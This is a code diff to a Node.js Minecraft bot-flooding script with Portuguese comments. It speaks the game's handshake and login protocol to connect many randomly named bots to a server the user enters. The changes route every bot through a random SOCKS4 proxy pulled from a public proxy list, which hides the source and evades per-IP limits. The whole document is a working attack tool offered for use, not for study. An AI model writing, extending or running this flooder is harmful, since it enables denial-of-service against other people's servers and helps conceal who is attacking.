@@ -1,8 +1,36 @@
-const net = require('net');
+const axios = require('axios');  // Usando axios para requisição HTTP
 const readline = require('readline');
 const chalk = require('chalk');
+const fs = require('fs');
+const { SocksClient } = require('socks');
 
 let verboseMode = false;
+let proxies = [];
+
+// URL onde as proxies SOCKS4 estão armazenadas (pode ser atualizada com o link direto para o raw file)
+const proxyURL = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt';
+
+// Carregar proxies automaticamente da URL
+async function loadProxiesFromURL() {
+  try {
+    const response = await axios.get(proxyURL);
+    const data = response.data;
+    proxies = data.split('\n').map(line => line.trim()).filter(line => line);
+    console.log(`Carregado ${proxies.length} proxies da URL.`);
+  } catch (error) {
+    console.error('Erro ao carregar proxies da URL:', error.message);
+  }
+}
+
+// Escolher uma proxy aleatória
+function getRandomProxy() {
+  if (proxies.length === 0) {
+    return null;
+  }
+  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+  const [ip, port] = proxy.split(':');
+  return { ip, port: parseInt(port, 10) };
+}
 
 function log(message, force = false) {
   if (verboseMode || force) {
@@ -84,89 +112,111 @@ function pingPacket() {
   return createPacket(0x01, payload);
 }
 
-function pingServer(serverIP, serverPort, callback) {
-  const client = new net.Socket();
-  
-  client.connect(serverPort, serverIP, () => {
-    log('Conectado para pingar o servidor...', false);
+function pingServerWithProxy(serverIP, serverPort, proxy, callback) {
+  const options = {
+    proxy: {
+      ipaddress: proxy.ip,
+      port: proxy.port,
+      type: 4,  // Tipo SOCKS4
+    },
+    command: 'connect',
+    destination: {
+      host: serverIP,
+      port: serverPort,
+    },
+  };
 
-    // Fase de handshaking para o status
-    client.write(handshakePacket(serverIP, serverPort, ConnectionState.STATUS));
+  SocksClient.createConnection(options).then(({ socket }) => {
+    log('Conectado via proxy SOCKS4 para pingar o servidor...', false);
 
-    // Enviando o status request
-    client.write(statusRequestPacket());
-  });
+    socket.write(handshakePacket(serverIP, serverPort, ConnectionState.STATUS));
+    socket.write(statusRequestPacket());
 
-  client.on('data', (data) => {
-    let offset = 0;
-    const { value: packetLength, size: lengthSize } = readVarInt(data, offset);
-    offset += lengthSize;
-    const { value: packetId, size: idSize } = readVarInt(data, offset);
-    offset += idSize;
+    socket.on('data', (data) => {
+      let offset = 0;
+      const { value: packetLength, size: lengthSize } = readVarInt(data, offset);
+      offset += lengthSize;
+      const { value: packetId, size: idSize } = readVarInt(data, offset);
+      offset += idSize;
 
-    if (packetId === 0x00) {
-      const { value: motdJson } = readString(data, offset);
-      
-      const cleanedMotdJson = motdJson.replace(/§[0-9a-fk-or]/g, '').replace(/\n/g, '\\n');
-      
-      try {
-        const motd = JSON.parse(cleanedMotdJson);
-        log(`MOTD do servidor: ${motd.description.text || motd.description}`, true);
-      } catch (e) {
-        log(chalk.yellow('JSON error:'), chalk.yellow(e.message), false);
-        log(chalk.green('Ignoring...'), false);
-        log(`MOTD JSON recebido ${cleanedMotdJson}:`, false);
+      if (packetId === 0x00) {
+        const { value: motdJson } = readString(data, offset);
+        const cleanedMotdJson = motdJson.replace(/§[0-9a-fk-or]/g, '').replace(/\n/g, '\\n');
+        try {
+          const motd = JSON.parse(cleanedMotdJson);
+          log(`MOTD do servidor: ${motd.description.text || motd.description}`, true);
+        } catch (e) {
+          log(chalk.yellow('JSON error:'), chalk.yellow(e.message), false);
+          log(chalk.green('Ignoring...'), false);
+          log(`MOTD JSON recebido ${cleanedMotdJson}:`, false);
+        }
+
+        socket.write(pingPacket());
       }
 
-      client.write(pingPacket());
-    }
+      if (packetId === 0x01) {
+        log('Servidor pingado com sucesso.', false);
+        socket.end();
+        callback();
+      }
+    });
 
-    if (packetId === 0x01) {
-      log('Servidor pingado com sucesso.', false);
-      client.end();
-      callback();
-    }
-  });
+    socket.on('error', (err) => {
+      console.error('Erro durante o ping:', err);
+      socket.end();
+    });
 
-  client.on('error', (err) => {
-    console.error('Erro durante o ping:', err);
-    client.end();
-  });
-
-  client.on('close', () => {
-    log('Conexão para o ping fechada.', false);
+    socket.on('close', () => {
+      log('Conexão para o ping fechada.', false);
+    });
+  }).catch((err) => {
+    console.error('Erro ao conectar via proxy SOCKS4:', err);
   });
 }
 
-function connectBot(serverIP, serverPort, username) {
-  pingServer(serverIP, serverPort, () => {
-    const client = new net.Socket();
-    let connectionState = ConnectionState.HANDSHAKING;
+function connectBotWithProxy(serverIP, serverPort, username, proxy) {
+  pingServerWithProxy(serverIP, serverPort, proxy, () => {
+    const options = {
+      proxy: {
+        ipaddress: proxy.ip,
+        port: proxy.port,
+        type: 4,  // Tipo SOCKS4
+      },
+      command: 'connect',
+      destination: {
+        host: serverIP,
+        port: serverPort,
+      },
+    };
 
-    client.connect(serverPort, serverIP, () => {
-      log(`Bot ${username} connected!`, true);
-      client.write(handshakePacket(serverIP, serverPort, ConnectionState.LOGIN));
-      client.write(loginStartPacket(username));
+    SocksClient.createConnection(options).then(({ socket }) => {
+      let connectionState = ConnectionState.HANDSHAKING;
+
+      log(`Bot ${username} connected via proxy!`, true);
+      socket.write(handshakePacket(serverIP, serverPort, ConnectionState.LOGIN));
+      socket.write(loginStartPacket(username));
       connectionState = ConnectionState.LOGIN;
-    });
 
-    client.on('data', (data) => {
-		
-    });
+      socket.on('data', (data) => {
+        // Trate os pacotes recebidos aqui
+      });
 
-    client.on('error', (err) => {
-      console.error(`Error for bot ${username}:`, err);
-    });
+      socket.on('error', (err) => {
+        console.error(`Error for bot ${username}:`, err);
+      });
 
-    client.on('close', () => {
-      log(`Connection closed for bot ${username}`, true);
+      socket.on('close', () => {
+        log(`Connection closed for bot ${username}`, true);
+      });
+    }).catch((err) => {
+      console.error(`Erro ao conectar bot ${username} via proxy:`, err);
     });
   });
 }
 
 function generateRandomBotName() {
   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  const length = Math.floor(Math.random() * 3) + 5; // Gera um nome com 5 a 7 caracteres
+  const length = Math.floor(Math.random() * 3) + 5;
   let botName = '';
   for (let i = 0; i < length; i++) {
     botName += characters.charAt(Math.floor(Math.random() * characters.length));
@@ -183,31 +233,34 @@ rl.question('Modo verbose? (s/n): ', (answer) => {
   verboseMode = answer.toLowerCase() === 's';
   
   rl.question('Modo debug? (s/n): ', (debugMode) => {
+    loadProxiesFromURL();  // Carregar as proxies da URL antes de iniciar
     if (debugMode.toLowerCase() === 's') {
       log('Entrando em modo debug...', true);
-      connectBot('127.0.0.1', 25565, 'BotDebug');
+      const proxy = getRandomProxy();
+      if (proxy) {
+        connectBotWithProxy('127.0.0.1', 25565, 'BotDebug', proxy);
+      } else {
+        console.log('Nenhuma proxy disponível.');
+      }
     } else {
       rl.question('Digite o IP do servidor: ', (serverIP) => {
         rl.question('Digite a porta do servidor: ', (serverPort) => {
-          rl.question('Digite o número de bots para conectar por segundo: ', (botsPerSecond) => {
-            rl.close();
+          rl.question('Digite o número de bots para conectar: ', (botNumber) => {
+            let botCount = 0;
 
-            log('Pingando o servidor antes de conectar os bots...', true);
-
-            pingServer(serverIP, parseInt(serverPort), () => {});
-              const connectRate = parseInt(botsPerSecond);
-              let botCount = 0;
-
-              log(`Conectando ${connectRate} bots por segundo a ${serverIP}:${serverPort} indefinidamente.`, true);
-
-              setInterval(() => {
-                for (let i = 0; i < connectRate; i++) {
-                  botCount++;
+            const interval = setInterval(() => {
+              if (botCount >= botNumber) {
+                clearInterval(interval);
+                rl.close();
+              } else {
+                const proxy = getRandomProxy();
+                if (proxy) {
                   const botName = generateRandomBotName();
-                  connectBot(serverIP, parseInt(serverPort), botName);
+                  connectBotWithProxy(serverIP, parseInt(serverPort), botName, proxy);
+                  botCount++;
                 }
-                log(`Total de bots conectados: ${botCount}`, true);
-              }, 1000);
+              }
+            }, 1000);
           });
         });
       });
